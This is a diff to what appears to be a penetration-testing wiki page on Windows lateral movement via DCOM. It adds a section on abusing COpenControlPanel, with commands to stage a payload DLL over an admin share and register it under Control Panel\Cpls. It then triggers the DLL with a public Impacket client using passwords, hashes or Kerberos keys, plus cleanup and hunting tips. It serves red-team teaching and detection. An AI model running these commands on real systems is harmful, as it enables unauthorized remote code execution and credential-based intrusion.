@@ -160,6 +160,36 @@ Values seen abused in practice:
 - `6` -> `WINPROJ.exe`
 - `7` -> `SCHDPLUS.exe`
 
+### COpenControlPanel — loading a registered Control Panel DLL
+
+The `COpenControlPanel` class (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) exposes `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Its `Open()` method causes Control Panel DLLs registered under the `Control Panel\Cpls` key to be loaded by a remote `dllhost.exe`. The class has no explicit launch/access permissions on tested systems, so it inherits the default DCOM policy (normally requiring an administrator for remote activation). A random item name is enough to make `Open()` process the registered DLLs; the payload does not need a `.cpl` extension, although it must be a valid DLL of the correct architecture.<sup>[[7]](#references)</sup>
+
+This primitive is **stage-and-trigger**, not command-only execution: first copy a DLL to the target and create a `REG_EXPAND_SZ` value that points to it, then activate the object over DCOM. For example, from an administrative Windows context:<sup>[[7]](#references)</sup>
+
+```cmd
+copy payload.dll \\target\C$\Windows\Temp\panel.dll
+reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
+```
+
+The public [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client implements the undocumented DCOM call with Impacket. Supplying an arbitrary Control Panel item name is sufficient; the client can report an RPC error even though `dllhost.exe` loaded the DLL.<sup>[[8]](#references)</sup>
+
+```bash
+git clone https://github.com/klsecservices/CPLDCOMTrigger
+cd CPLDCOMTrigger
+python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random
+
+# Pass-the-hash and Kerberos are also implemented
+python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
+python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
+```
+
+Operationally, this path also needs a file-write channel and remote registry access, so it is noisier than `MMC20`/`ShellWindows`. It creates a persistence side effect because opening Control Panel later can load the same entry again. Remove the value after execution and hunt for unexpected `Control Panel\Cpls` values together with unusual DLL loads in `dllhost.exe`.<sup>[[7]](#references)</sup>
+
+```cmd
+reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
+del \\target\C$\Windows\Temp\panel.dll
+```
+
 ### Automation Tools for Lateral Movement
 
 Two tools are highlighted for automating these techniques:
@@ -205,6 +235,8 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 
+
+
 ## References
 
 - [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
@@ -213,5 +245,6 @@ SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\tem
 - [4] [Lateral Movement: Abuse the Power of DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
 - [5] [Leveraging Excel DDE for lateral movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
 - [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
-
+- [7] [Using DCOM objects for remote command execution](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
+- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
 {{#include ../../banners/hacktricks-training.md}}
